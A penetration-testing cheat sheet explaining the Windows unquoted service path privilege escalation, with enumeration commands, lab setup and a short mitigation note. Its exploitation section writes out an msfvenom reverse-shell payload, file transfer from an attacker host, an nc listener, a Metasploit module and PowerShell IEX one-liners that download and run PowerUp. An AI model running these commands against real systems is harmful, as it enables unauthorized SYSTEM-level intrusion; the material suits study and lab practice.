---
title: "Unqoted Service Paths"
tags: 
- sheets
---

When a **service** is created whose **executable path** contains **_spaces_** and isn’t enclosed within **_quotes_**, leads to a vulnerability known as Unquoted Service Path which allows a user to gain **SYSTEM** privileges *(only if the vulnerable service is running with SYSTEM privilege level which most of the time it is)*. This happens due to how Windows handles spaces: if the service is not enclosed within quotes & is having spaces => it would handle the space as a break and pass the rest of the service path as an argument.


## Root Cause
This is caused by the [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function which creates a new process. More specifically the `lpApplicationName` string parameter which can be the full path / filename of the module to be executed. If the filename is a long string spanning acrosss multiple sub directories, contains spaces and is not enclosed in quotation marks, it will be executed in the order from left to right until the space is reached & will append `.exe` @ the end of this spaced path. 

### Example
- Consider the following path: `C:\Program Files\A Sub\B Sub\C Sub\executeMe.exe`
- In order to run `executeMe.exe` the Windows API will interpret it in the following order
	- `C:\Program.exe`
	- `C:\Program Files\A.exe`
	- `C:\Program Files\A Sub\B.exe`
	- `C:\Program Files\A Sub\B Sub\C.exe`
	- `C:\Program Files\A Sub\B Sub\C Sub\executeMe.exe`
- If `Program.exe` is not found, then `A.exe` will be executed and so on



## CheckList
- [ ] List all unquoted service paths *(minus built-in Windows services)*. Are there any available?
	```bash
	wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
	wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
	gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name # (PS)
	```
- [ ] With what priviliges is the targetted service running *(should be as `LocalSystem`)* & what's the absolute path of the executable ?
	```bash
	sc qc <service-name> 
	# Look for the following
	#  START_TYPE is it AUTO_START?
	#  BINARY_PATH_NAME
	#  SERVICE_START_NAME
	```
- [ ] Does your user have write access in one of the folders where the binary path resides?
	```bash
	# Do this for every one of them 
	icacls "C:\path\to\dir\of\your\subdir"
	Get-acl 'C:\path\to\dir' | % {$_.access}   # (PS)
	# Looking for write acesss on one of your groups (e.g BUILTIN\Users)
	```
- [ ] Do u have the rights to restart the service? If not, it should be an auto-start service so that upon rebooting the system it communicates with the [Service Control Manager](https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager) & gets your payload executed
	```bash
	# If you're confused about what this command spits out
	# check out this: http://woshub.com/set-permissions-on-windows-service/
	sc sdshow <service-name>
	```

## Exploitation
Considering that we have a low privilege shell already on the target system & all of the requirments above are met. Then we can just drop our malicious executable `B.exe` in `C:\Program Files\A Sub\`. When the system boots, Windows auto starts some of its services. Services on Windows communicate with the [_Service Control Manager_](https://en.wikipedia.org/wiki/Service_Control_Manager) which is responsible to start, stop and interact with these service processes. It starts this service with whatever privileges it has to run, thus letting us run whatever we want as `SYSTEM`*(read more [here](https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco) about differences between accounts & privileges)*

> For a more concrete example check out [Privesc w Unquoted Service Path](Steel%20Mountain%20--%20THM.md#Privesc%20w%20Unquoted%20Service%20Path)

### Manual
```bash
# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=1337 -f exe -o B.exe

# Transfer to target

# through impacket's smb server
host: python /usr/share/doc/python-impacket/examples/smbserver.py sharedfolder .
target: copy \\LHOST\sharedfolder\B.exe .
# or powershell
powershell -Command Invoke-WebRequest -Uri http://LHOST/B.exe -OutFile B.exe

# Start listener 
nc -nvlp 1337

# Restart service & profit
sc stop <service-name>
sc start <service-name>
# if access is denied just reboot
shutdown /r /t 0
```


### Metasploit

```bash
# Setup listener
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set lhost <ip>
set lport <port>
exploit -j

# Exploit
use exploit/windows/local/trusted_service_path  
set session 1  
exploit
```

### PowerSploit
- Get a local copy of [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
```bash
# Setup local http/smb server to serve PowerUp

# Call Get-ServiceUnquoted from PowerUp without touching the disk
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1');Get-ServiceUnquoted"

# Checks for every spaced path, whether the context of the cmd shell  have write/modify access or not.
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Get-ChildItem C:\ -Recurse | Get-ModifiablePath"

# patches the command given to it as an argument to the pre-compiled C# executable service binary to the specified path.
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Write-ServiceBinary -Name 'Some Vulnerable Service' -Command '\\LHOST\sharedfolder\B.exe' -Path 'C:\Program Files\A Subfolder\B.exe'"
```


## Lab Environment Setup

### Creating users
```bash
# Create a new user & add him to the Administrators group
net user dumbadmin /add
net localgroup Administrators dumbadmin /add
net localgroup Users dumbadmin /delete

# Create a low-privileged user
net user normie /add
```

This is what you should have now

![[write-ups/images/Pasted image 20220821085517.png]]

### Deploy vulnerable service
Login as the `dumbadmin` user & spawn a priviliged command prompt, then use [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) to create the service
```bash
sc create "Vulnerable Service" binpath= "C:\Program Files\A Sub\B Sub\C Sub\ape.exe" Displayname= "Service Vuln to Unqoted Service Path" start= auto
```

Now create the folders & assign write permissions to `BUILTIN\Users` on `A Sub` or `B Sub` using [icacls](https://ss64.com/nt/icacls.html)
```bash
mkdir "C:\Program Files\A Sub\B Sub\C Sub"
icacls "C:\Program Files\A Sub"
icacls "C:\Program Files\A Sub" /grant "BUILTIN\Users":W
```

![[write-ups/images/Pasted image 20220821090209.png]]

The part we're interested in is the first line: `A Sub BUILTIN\Users:(W)`. This confirms that any normal users have write access to the `A Sub` directory
To finally verify that everything is running as expected we can find every service which isn't enclosed in double quotes

![[write-ups/images/Pasted image 20220821090532.png]]

## Mitigation
Gets all the services from `HKLM\SYSTEM\CurrentControlSet\services` & find those services with spaces and without quotes, prepends and appends double quotes to the service binary executable and fixes it.

## Refs
- [Windows Privilege Escalation — Part 1 (Unquoted Service Path)](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)
- [Hijack Execution Flow: Path Interception by Unqoted Path -- MITRE](https://attack.mitre.org/techniques/T1574/009/)

## See Also